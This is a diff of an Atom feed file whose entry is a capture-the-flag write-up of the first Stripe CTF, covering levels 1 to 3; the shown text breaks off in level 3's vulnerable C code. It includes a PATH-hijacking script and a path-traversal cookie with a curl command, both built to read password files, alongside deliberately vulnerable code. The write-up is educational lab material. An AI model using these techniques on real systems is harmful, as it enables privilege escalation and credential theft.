@@ -1,11 +1,12 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/burp.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-11-24T04:20:00-05:00</updated><entry><title>The First Stripe CTF</title><link href="http://bt3gl.github.io/the-first-stripe-ctf.html" rel="alternate"></link><updated>2014-11-24T04:20:00-05:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-11-24:the-first-stripe-ctf.html</id><summary type="html">&lt;p&gt;Although I did not have the chance of playing in neither of the &lt;a href="https://stripe.com/blog/capture-the-flag"&gt;three&lt;/a&gt; &lt;a href="https://stripe.com/blog/capture-the-flag-20"&gt;Stripe&lt;/a&gt; &lt;a href="https://stripe.com/blog/ctf3-launch"&gt;CTFs&lt;/a&gt;, I was quite enthralled when I took a look at the problems. I decided to solve them anyway and I am writing this series of writeups.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh - Burp</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/burp.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-11-24T04:20:00-05:00</updated><entry><title>The First Stripe CTF</title><link href="http://bt3gl.github.io/the-first-stripe-ctf.html" rel="alternate"></link><published>2014-11-24T04:20:00-05:00</published><updated>2014-11-24T04:20:00-05:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-11-24:/the-first-stripe-ctf.html</id><summary type="html">&lt;p&gt;Although I did not have the chance of playing in neither of the &lt;a href="https://stripe.com/blog/capture-the-flag"&gt;three&lt;/a&gt; &lt;a href="https://stripe.com/blog/capture-the-flag-20"&gt;Stripe&lt;/a&gt; &lt;a href="https://stripe.com/blog/ctf3-launch"&gt;CTFs&lt;/a&gt;, I was quite enthralled when I took a look at the problems. I decided to solve them anyway and I am writing this series of writeups.&lt;/p&gt;
+&lt;p&gt;This post is about the first &lt;a href="https://stripe.com/"&gt;Stripe&lt;/a&gt; CTF …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Although I did not have the chance of playing in neither of the &lt;a href="https://stripe.com/blog/capture-the-flag"&gt;three&lt;/a&gt; &lt;a href="https://stripe.com/blog/capture-the-flag-20"&gt;Stripe&lt;/a&gt; &lt;a href="https://stripe.com/blog/ctf3-launch"&gt;CTFs&lt;/a&gt;, I was quite enthralled when I took a look at the problems. I decided to solve them anyway and I am writing this series of writeups.&lt;/p&gt;
 &lt;p&gt;This post is about the first &lt;a href="https://stripe.com/"&gt;Stripe&lt;/a&gt; CTF, which &lt;a href="https://stripe.com/blog/capture-the-flag-wrap-up"&gt;happened in the beginning of 2012&lt;/a&gt;. I was able to fully reproduce the game by using a &lt;a href="http://www.janosgyerik.com/hacking-contest-on-a-live-cd/"&gt;Live CD Image&lt;/a&gt;. Other options were &lt;a href="https://stripe.com/blog/capture-the-flag-wrap-up"&gt;direct download and BitTorrent&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;This CTF was composed of 6 levels, and its style was very similar to other Wargames I've talked about before in this blog (for instance, check &lt;a href="http://overthewire.org/wargames/"&gt;OverTheWire's&lt;/a&gt; &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Natas&lt;/a&gt;, &lt;a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html"&gt;Narnia&lt;/a&gt;, and &lt;a href="http://bt3gl.github.io/cryptography-war-beating-krypton.html"&gt;Krypton&lt;/a&gt;).&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Level 1: Environment Variables&lt;/h2&gt;
 &lt;p&gt;When I booted the image  I got this first message:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/O9ixhUv.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/O9ixhUv.jpg"&gt;&lt;/p&gt;
 &lt;p&gt;In the  &lt;em&gt;level01&lt;/em&gt; folder I found:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;
@@ -15,11 +16,11 @@
 &lt;p&gt;The C source code of this binary:&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/DgB55I8.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/DgB55I8.jpg"&gt;&lt;/p&gt;
 &lt;p&gt;Checking the code closely we notice the following lines:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Current time: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-  &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-  &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="nt"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Current time: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+  &lt;span class="nt"&gt;fflush&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+  &lt;span class="nt"&gt;system&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -34,24 +35,24 @@
 3
 4
 5
-6&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/bin/sh&lt;/span&gt;
+6&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/sh&lt;/span&gt;
 &lt;span class="nb"&gt;cd&lt;/span&gt; /tmp
 &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/bin/cat /home/level01/.password &amp;gt; date&amp;#39;&lt;/span&gt;
 chmod +x date
-&lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
 /levels/level01/level01
 &lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Level 2: Client's Cookies&lt;/h2&gt;
 &lt;p&gt;This level is about finding a vulnerability in a PHP script  that  greets the user with her/his saved data.&lt;/p&gt;
 &lt;p&gt;The program implements this functionality by setting a cookie that saves the user's username and age. In future visits to the page, the program is then able to print  &lt;em&gt;You’re NAME, and your age is AGE&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;Inspecting closely the code we see that the client's cookie is read without sanitizing its content:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
     &lt;span class="nv"&gt;$out&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user_details&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-      &lt;span class="nx"&gt;setcookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user_details&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$filename&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+      &lt;span class="nb"&gt;setcookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user_details&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$filename&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
     &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
       &lt;span class="nv"&gt;$out&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;file_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/tmp/level02/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user_details&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
@@ -61,129 +62,129 @@ chmod +x date
 
 
 &lt;p&gt;And then the results of this read is printed:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php echo $out ?&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$out&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;An obvious way to exploit this vulnerability is by building our own &lt;a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html"&gt;request&lt;/a&gt; that makes the program read the password at &lt;em&gt;/home/level02/.password&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;The cookie is set in the client side so we have lots of freedom to exploit it. For instance, we could use &lt;a href="http://portswigger.net/burp/"&gt;Burp Suite&lt;/a&gt; to intercept the request and add the crafted cookie header. We could also use &lt;a href="https://chrome.google.com/webstore/detail/web-inspector/enibedkmbpadhfofcgjcphipflcbpelf?hl=en"&gt;Chrome Webinspector&lt;/a&gt; to  copy the &lt;a href="http://en.wikipedia.org/wiki/Basic_access_authentication"&gt;Authorization header&lt;/a&gt; for the same purpose. The Cookie header would look like:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;user_details&lt;/span&gt;&lt;span class="o"&gt;=../../&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="sr"&gt;/level02/&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;password&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;user_details&lt;/span&gt;&lt;span class="o"&gt;=../../&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="sr"&gt;/level02/&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;password&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Interestingly, it is also possible to solve this problem with just one instruction in the command line:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;curl&lt;/span&gt;  &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="n"&gt;level01&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;level01&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;digest&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;user_details=../../home/level02/.password&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8002&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;level02&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl  --user level01:&lt;span class="k"&gt;$(&lt;/span&gt;cat /home/level01/.password&lt;span class="k"&gt;)&lt;/span&gt; --digest -b &lt;span class="s2"&gt;&amp;quot;user_details=../../home/level02/.password&amp;quot;&lt;/span&gt; localhost:8002/level02.php
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Where the flag &lt;strong&gt;--digest&lt;/strong&gt; enables HTTP authentication, and the flags &lt;strong&gt;-b&lt;/strong&gt; or &lt;strong&gt;--cookie&lt;/strong&gt; let us determine the cookie to be sent.&lt;/p&gt;
 &lt;p&gt;Note: In the LiveCD this level is modified to use Python and &lt;a href="http://flask.pocoo.org/docs/0.10/"&gt;Flask&lt;/a&gt;. Luckily, I had some previous experience in Flask (check out my &lt;a href=""&gt;Anti-Social Network&lt;/a&gt;) and it was pretty easy to spot that the Pyhton code does &lt;em&gt;exactly&lt;/em&gt; the same thing as the one above.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Level 3: Failure in Input Validation&lt;/h2&gt;
 &lt;p&gt;The third level comes with another &lt;strong&gt;setuid&lt;/strong&gt; binary with the purpose of modifying a string:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;levels&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;level03&lt;/span&gt;
-    &lt;span class="nl"&gt;Usage:&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;level03&lt;/span&gt; &lt;span class="n"&gt;INDEX&lt;/span&gt; &lt;span class="n"&gt;STRING&lt;/span&gt;
-    &lt;span class="n"&gt;Possible&lt;/span&gt; &lt;span class="n"&gt;indices&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
-    &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;to_upper&lt;/span&gt;    &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;to_lower&lt;/span&gt;
-    &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;capitalize&lt;/span&gt;  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ /levels/level03
+    Usage: ./level03 INDEX STRING
+    Possible indices:
+    &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; to_upper    &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; to_lower
+    &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; capitalize  &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; length
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The C code is also given:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="nx"&gt;define&lt;/span&gt; &lt;span class="nx"&gt;NUM_FNS&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;define&lt;/span&gt; &lt;span class="nt"&gt;NUM_FNS&lt;/span&gt; &lt;span class="nt"&gt;4&lt;/span&gt;
 
-&lt;span class="nx"&gt;typedef&lt;/span&gt; &lt;span class="kr"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;fn_ptr&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="kr"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="nt"&gt;typedef&lt;/span&gt; &lt;span class="nt"&gt;int&lt;/span&gt; &lt;span class="o"&gt;(*&lt;/span&gt;&lt;span class="nt"&gt;fn_ptr&lt;/span&gt;&lt;span class="o"&gt;)(&lt;/span&gt;&lt;span class="nt"&gt;const&lt;/span&gt; &lt;span class="nt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*);&lt;/span&gt;
 
-&lt;span class="kr"&gt;int&lt;/span&gt; &lt;span class="nx"&gt;to_upper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="kr"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;{(...)}&lt;/span&gt;
+&lt;span class="nt"&gt;int&lt;/span&gt; &lt;span class="nt"&gt;to_upper&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;const&lt;/span&gt; &lt;span class="nt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nt"&gt;str&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;(...)&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
 
-&lt;span class="kr"&gt;int&lt;/span&gt; &lt;span class="nx"&gt;to_lower&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="kr"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;{(...)}&lt;/span&gt;
+&lt;span class="nt"&gt;int&lt;/span&gt; &lt;span class="nt"&gt;to_lower&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;const&lt;/span&gt; &lt;span class="nt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nt"&gt;str&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;(...)&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
 
-&lt;span class="kr"&gt;int&lt;/span&gt; &lt;span class="nx"&gt;capitalize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="kr"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;{(...)}&lt;/span&gt;
+&lt;span class="nt"&gt;int&lt;/span&gt; &lt;span class="nt"&gt;capitalize&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;const&lt;/span&gt; &lt;span class="nt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nt"&gt;str&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;(...)&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
 
-&lt;span class="kr"&gt;int&lt;/span&gt; &lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="kr"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;{(...)}&lt;/span&gt;
+&lt;span class="nt"&gt;int&lt;/span&gt; &lt;span class="nt"&gt;length&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;const&lt;/span&gt; &lt;span class="nt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nt"&gt;str&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;(...)&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
 
-&lt;span class="kr"&gt;int&lt;/span&gt; &lt;span class="nx"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="kr"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nt"&gt;int&lt;/span&gt; &lt;span class="nt"&gt;run&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;const&lt;/span&gt; &lt;span class="nt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nt"&gt;str&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;
-  &lt;span class="c1"&gt;// This function is now deprecated.&lt;/span&gt;
-  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;str&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="err"&gt;//&lt;/span&gt; &lt;span class="err"&gt;This&lt;/span&gt; &lt;span class="err"&gt;function&lt;/span&gt; &lt;span class="err"&gt;is&lt;/span&gt; &lt;span class="err"&gt;now&lt;/span&gt; &lt;span class="err"&gt;deprecated.&lt;/span&gt;
+  &lt;span class="err"&gt;return&lt;/span&gt; &lt;span class="err"&gt;system(str)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
 
-&lt;span class="kr"&gt;int&lt;/span&gt; &lt;span class="nx"&gt;truncate_and_call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;fn_ptr&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;fns&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kr"&gt;int&lt;/span&gt; &lt;span class="nx"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kr"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;user_string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nt"&gt;int&lt;/span&gt; &lt;span class="nt"&gt;truncate_and_call&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;fn_ptr&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nt"&gt;fns&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;int&lt;/span&gt; &lt;span class="nt"&gt;index&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nt"&gt;user_string&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;
-  &lt;span class="kr"&gt;char&lt;/span&gt; &lt;span class="nx"&gt;buf&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-  &lt;span class="c1"&gt;// Truncate supplied string&lt;/span&gt;
-  &lt;span class="nx"&gt;strncpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;user_string&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-  &lt;span class="nx"&gt;buf&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
